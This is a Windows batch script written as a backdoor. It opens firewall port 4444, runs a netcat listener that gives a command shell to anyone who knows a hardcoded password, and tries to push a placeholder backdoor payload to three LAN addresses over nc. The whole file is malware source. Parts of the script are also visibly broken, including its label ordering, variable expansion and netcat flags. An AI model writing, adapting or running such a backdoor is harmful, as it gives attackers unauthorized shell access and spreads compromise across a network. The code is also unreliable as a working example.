@echo off

set PORT=4444
set PASSWORD=secretpassword

:spread
    set "target_devices=192.168.1.10 192.168.1.11 192.168.1.12"
    for %%a in (%target_devices%) do (
        set "device=%%a"
        set "script_data=// Backdoor script data..."
        echo %script_data% | nc %device% %PORT%
        echo [*] Spreaded to %device%
    )
    goto :eof

:main
    netsh advfirewall firewall add rule name="Backdoor Port" dir=in action=allow protocol=TCP localport=%PORT%
    start /b cmd /c "echo [*] Listening on 0.0.0.0:%PORT% & netcat -l -p %PORT% -c \"echo Password: & set /p password= & if !password! equ %PASSWORD% (echo Access granted & cmd /k) else (echo Access denied & exit /b)\""
    goto :spread

call :main